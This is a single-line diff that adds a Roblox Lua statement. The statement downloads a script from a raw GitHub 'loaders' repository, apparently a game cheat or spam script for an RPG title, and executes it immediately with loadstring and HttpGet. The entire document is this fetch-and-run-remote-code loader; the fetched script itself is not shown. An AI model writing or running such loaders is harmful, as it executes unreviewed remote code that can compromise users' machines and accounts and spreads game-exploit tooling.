@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/untitled-rpg-game-spam3-snp4ozqnoa4e25.lua"))()
